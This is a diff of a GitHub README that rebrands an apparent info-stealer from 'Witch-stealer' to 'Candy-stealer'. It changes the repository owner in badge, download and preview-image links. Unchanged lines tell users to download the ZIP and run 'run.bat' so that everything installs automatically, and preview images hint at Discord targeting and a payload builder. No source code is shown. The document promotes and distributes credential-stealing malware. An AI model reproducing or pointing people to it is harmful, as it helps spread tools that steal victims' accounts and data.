@@ -1,23 +1,23 @@
 <div align="center">
   <img src="https://cdn.discordapp.com/attachments/1348499307015438427/1380062075405074462/discord-avatar-512-14PL5.png?ex=68428277&is=684130f7&hm=c04f339d6a92382d8640494544b673cf9e968af6884016c640c5c7a577208a6f&" width="200" alt="img" />
-  <h2><a href="https://github.com/addadi000/Witch-stealer">Witch</a></h2>
+  <h2><a href="https://github.com/addadi000/Candy-stealer">Candy</a></h2>
 </div>
 
 <div align="center">
-  <a aria-label="GitHub Maintained" href="https://github.com/addadi000/Witch-stealer">
+  <a aria-label="GitHub Maintained" href="https://github.com/nojumpdelay/Candy-stealer">
     <img src="https://img.shields.io/badge/Yes-ffffff?logo=github&style=flat-square&label=Maintained%3F">
   </a>
-  <a aria-label="License" href="https://github.com/addadi000/Witch-stealer/LICENSE">
-    <img src="https://img.shields.io/github/license/addadi000/Witch-stealer?color=ffffff&logo=github&style=flat-square&label=License">
+  <a aria-label="License" href="https://github.com/nojumpdelay/Candy-stealer/LICENSE">
+    <img src="https://img.shields.io/github/license/nojumpdelay/Candy-stealer?color=ffffff&logo=github&style=flat-square&label=License">
   </a>
-  <a aria-label="Version" href="https://github.com/addadi000/Witch-stealer/releases">
-    <img src="https://img.shields.io/github/v/release/addadi000/Witch-stealer?color=ffffff&logo=github&style=flat-square&label=Version">
+  <a aria-label="Version" href="https://github.com/nojumpdelay/Candy-stealer/releases">
+    <img src="https://img.shields.io/github/v/release/nojumpdelay/Candy-stealer?color=ffffff&logo=github&style=flat-square&label=Version">
   </a>
-  <a aria-label="Issues" href="https://github.com/addadi000/Witch-stealer/issues">
-    <img src="https://img.shields.io/github/issues/addadi000/Witch-stealer?color=ffffff&logo=github&style=flat-square&label=Issues">
+  <a aria-label="Issues" href="https://github.com/nojumpdelay/Candy-stealer/issues">
+    <img src="https://img.shields.io/github/issues/nojumpdelay/Candy-stealer?color=ffffff&logo=github&style=flat-square&label=Issues">
   </a>
-  <a aria-label="Stars" href="https://github.com/addadi000/Witch-stealer/stargazers">
-    <img src="https://img.shields.io/github/stars/addadi000/Witch-stealer?color=ffffff&logo=github&style=flat-square&label=Stars">
+  <a aria-label="Stars" href="https://github.com/nojumpdelay/Candy-stealer/stargazers">
+    <img src="https://img.shields.io/github/stars/nojumpdelay/Candy-stealer?color=ffffff&logo=github&style=flat-square&label=Stars">
     <br>
     <img src="https://img.shields.io/github/followers/nojumpdelay?color=%23000000&label=Follow%20me"> 
   </a>
@@ -76,7 +76,7 @@
 > Did an error occur? If you have a GitHub account, please consider opening an issue. We’ll do our best to improve.
 
 - **🔩 Installation Tutorial**  
-To get started, [click here](https://github.com/addadi000/Witch-stealer/archive/refs/heads/main.zip) to download the ZIP file.<br>
+To get started, [click here](https://github.com/nojumpdelay/Candy-stealer/archive/refs/heads/main.zip) to download the ZIP file.<br>
 After downloading the ZIP file, extract it and run `run.bat`. Everything else will install automatically<br>
 Enjoy >:)
 
@@ -85,10 +85,10 @@ Enjoy >:)
 ## 🖼️ Preview
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/addadi000/Witch-stealer/refs/heads/main/.github/img/discord1.png" width="500" alt="img" />
+  <img src="https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/.github/img/discord1.png" width="500" alt="img" />
 
   <h1> <h1>
-  <img src="https://raw.githubusercontent.com/addadi000/Witch-stealer/refs/heads/main/.github/img/build.png" width="900" alt="img" />
+  <img src="https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/.github/img/build.png" width="900" alt="img" />
 </div>
 
 ---
